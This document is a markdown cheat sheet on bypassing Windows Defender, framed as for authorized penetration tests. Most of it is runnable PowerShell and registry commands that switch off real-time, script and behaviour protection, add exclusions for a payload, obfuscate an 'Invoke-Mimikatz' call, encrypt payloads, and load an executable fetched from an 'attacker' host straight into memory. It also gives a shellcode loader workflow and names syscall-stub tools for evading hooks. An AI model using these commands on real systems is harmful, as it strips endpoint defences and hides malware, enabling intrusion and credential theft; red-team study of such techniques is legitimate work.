# Windows Defender Evasion

Techniques for bypassing Windows Defender during authorized penetration tests.

**MITRE ATT&CK**: T1562.001, T1027, T1055, T1140

## Check Defender Status

```powershell
# Defender status
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled, BehaviorMonitorEnabled

# Definitions version
Get-MpComputerStatus | Select-Object AntivirusSignatureLastUpdated, AntivirusSignatureVersion

# Exclusions (if readable)
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
Get-MpPreference | Select-Object -ExpandProperty ExclusionExtension
Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess
```

## Disable Defender (Requires Admin)

```powershell
# Disable real-time protection (requires Tamper Protection to be OFF)
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable all protections
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableScriptScanning $true

# Add exclusion path (stealthier — Defender stays on)
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionProcess "payload.exe"
Add-MpPreference -ExclusionExtension ".exe"
```

```cmd
:: Via registry (works even when Set-MpPreference is blocked)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
```

## EICAR Test

```cmd
:: Verify Defender is active
echo X5O!P%%@AP[4\PZX54(P^^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* > eicar.txt
:: If Defender deletes this file -> active
```

## Payload Obfuscation Techniques

### String Obfuscation

```powershell
# Variable concatenation
$a = 'Invoke'; $b = '-Mimikatz'; IEX "$a$b"

# Char array
$cmd = [char[]](73,110,118,111,107,101,45,77,105,109,105,107,97,116,122) -join ''

# Base64
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
powershell.exe -EncodedCommand $encoded
```

### Payload Encryption

```powershell
# XOR encryption
function Invoke-XOR {
    param([byte[]]$Data, [byte]$Key)
    $Data | ForEach-Object { $_ -bxor $Key }
}

# AES encryption/decryption for payloads
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789ABCDEF")
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$encryptor = $aes.CreateEncryptor()
$encrypted = $encryptor.TransformFinalBlock($payload, 0, $payload.Length)
```

### In-Memory Execution

```powershell
# Load .NET assembly in memory (no file on disk)
$bytes = (Invoke-WebRequest http://attacker/payload.exe).Content
[System.Reflection.Assembly]::Load($bytes)
[Payload.Program]::Main(@())

# Reflective PE loading
$bytes = [System.IO.File]::ReadAllBytes("C:\temp\payload.exe")
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, @(,@()))
```

### Syscall Stubs

Using direct system calls to avoid userland API hooks:

```
NtAllocateVirtualMemory  → replaces VirtualAlloc
NtWriteVirtualMemory     → replaces WriteProcessMemory
NtCreateThreadEx         → replaces CreateRemoteThread
NtProtectVirtualMemory   → replaces VirtualProtect
```

Tools: SysWhispers2, SysWhispers3, HellsGate, HalosGate

## Signature Evasion Workflow

```
1. Generate payload (msfvenom / custom)
2. Encrypt payload (AES/XOR)
3. Write loader that:
   a. Decrypts payload in memory
   b. Allocates RWX memory
   c. Copies decrypted shellcode
   d. Executes (callback or CreateThread)
4. Compile with unique strings / metadata
5. Test against Defender before deploying
```

## Detection Check Commands

```powershell
# Check if specific file is flagged
Start-MpScan -ScanPath "C:\temp\payload.exe" -ScanType CustomScan

# Scan results
Get-MpThreatDetection | Select-Object ThreatName, ProcessName, ActionSuccess

# Threat history
Get-MpThreat | Format-List *

# Test payload without execution
Test-MpPreference -Scan -ScanPath "C:\temp"
```

## Defender Attack Surface Reduction Rules

```powershell
# Check ASR rules (if configured)
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions
# 0=Disabled, 1=Block, 2=Audit, 6=Warn
```
